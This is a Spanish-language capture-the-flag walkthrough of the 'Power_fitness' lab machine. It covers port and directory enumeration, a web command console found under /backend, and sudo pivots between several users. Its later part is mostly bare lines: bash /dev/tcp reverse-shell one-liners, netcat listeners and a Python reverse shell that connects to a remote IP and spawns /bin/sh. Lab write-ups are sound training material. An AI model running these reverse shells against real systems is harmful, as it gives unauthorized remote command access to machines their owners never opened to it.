# >_ [Power_fitness]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Whoami Labs |
| **Dificultad** | 🟢 Fácil  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-09-18 |

---

## 📝 Descripción

Máquina enfocada en la explotación web y en las tareas cron para encontrar la flag.

---

## 🔍 1. Fase de Reconocimiento y Enumeración

### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
sudo nmap -p- --open -n 172.17.0.2 -oN allPorts
```

<img width="1155" height="202" alt="1Escaneo" src="https://github.com/user-attachments/assets/a9ed48a8-3a30-4dfb-8aa1-ccdabaf60f77" />

Descubrimos abierto solo el puerto 80 con el servicio http.


**Resultados del escaneo:**
* **Puerto 80/TCP**: HTTP



### Enumeración de servicios
Continuamos con un escaneo más profundo de los servicios encontrados::

```bash
nmap -p80 -sCV 172.17.0.2 -oN targeted
```


<img width="1108" height="269" alt="2Escaneopuerto" src="https://github.com/user-attachments/assets/2a2efacb-9b27-4292-9000-0b280c656e83" />
<br><br>


### Enumeración Web (Puerto 80)
Al acceder al sitio web, nos encontramos con la siguiente página:
<img width="1635" height="836" alt="3Pagweb" src="https://github.com/user-attachments/assets/a14b05bb-b09a-407f-913e-56db5f9bbdd8" />



Como la página principal no nos proporciona información relevante, vamos a aplicar fuzzing de directorios usando gobuster para buscar rutas adicionales:


```bash
gobuster dir -u http://172.17.0.2/ \
    -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
    -t 200 -k -r --no-error
```
<img width="1878" height="574" alt="4gobuster" src="https://github.com/user-attachments/assets/aff88e26-c3c6-4f45-8674-83f14e7ecf0e" />

Cuando finaliza, vemos que encontró cuatro rutas, la más interesante es /backend, entramos para mirar que contiene y vemos que hay un archivo php llamado gym_console.php
Este archivo se ejecuta en la página web y es una consola que ejecuta los comandos que le pasemos pero como el usuario www-data.

<img width="1155" height="945" alt="7consolacatetc" src="https://github.com/user-attachments/assets/5154a1d4-8ea9-4e1f-bf48-d93b981609ba" />

En el archivo passwd solo vemos usuarios pero ninguna clave, así que miramos con sudo -l qué comandos podemos ejecutar con privilegios de sudo y determinar si tenemos permisos que puedan ser relevantes para la escalada de privilegios. Y vemos que podemos ejecutar como el usuario trainer, mediante sudo y sin contraseña /bin/bash.

<img width="956" height="798" alt="8jugoso" src="https://github.com/user-attachments/assets/99e31569-d4a6-4f0e-914d-7e82b30f341a" />

Así que vamos a lanzar una revel shell, nos ponemos a la escucha en el puerto 442 con el siguiente comando:


```bash
sudo nc -lvnp 442
```
Desde la consola de la página web lanzamos la revel shell como el usuario trainer.
<img width="927" height="330" alt="10lanzamosRevel" src="https://github.com/user-attachments/assets/9c35bc7e-dd13-44bc-9e36-8d739fc4bab6" />

Miramos en nuestra terminal si nos ha llegado y ha funcionado perfectamente.

<img width="996" height="293" alt="10esperarRevel" src="https://github.com/user-attachments/assets/f2c31646-9116-428b-920b-87e72dc132db" />


Ahora tenemos que seguir buscando como escalar privilegios, comenzamos probando de nuevo sudo -l y vemos que también podemos...

<img width="998" height="313" alt="11coachahora" src="https://github.com/user-attachments/assets/f4236703-7eea-46b8-9fc8-03bb04a36b2f" />


<img width="1244" height="464" alt="12nosfuimos" src="https://github.com/user-attachments/assets/2baad9fd-b0f9-4464-823d-c64326984a51" />

<img width="843" height="199" alt="13sanitizamostty" src="https://github.com/user-attachments/assets/d4d9a740-0d21-47e2-b7f0-905c25441795" />

<img width="1236" height="249" alt="14otromas" src="https://github.com/user-attachments/assets/2fe2bdf3-762b-4c80-af10-2eafbed4b129" />

<img width="1232" height="223" alt="14venga" src="https://github.com/user-attachments/assets/0e484871-9d9a-47f9-9e6c-290247c81815" />
sudo -u trainer /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/442 0>&1'

sudo -u coach /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'

sudo -u nutritionist /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/444 0>&1'

<img width="1005" height="205" alt="15aleluya" src="https://github.com/user-attachments/assets/e03b9474-6b5f-4995-9562-5fbcf1f8b82a" />


<img width="1152" height="603" alt="16podriaser" src="https://github.com/user-attachments/assets/9c98e8f8-9491-4e7c-9fad-737ef27b7820" />

<img width="891" height="248" alt="16podriayes" src="https://github.com/user-attachments/assets/98dfcaac-dfa0-41b1-a178-2994c29df908" />


sudo nc -lvnp 440

import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i"])



<img width="914" height="307" alt="18flag" src="https://github.com/user-attachments/assets/17c9a34e-01c7-4230-938f-cbfe57276251" />

<img width="1035" height="650" alt="porsi" src="https://github.com/user-attachments/assets/6a8eae5f-8615-40eb-b563-8074667172df" />








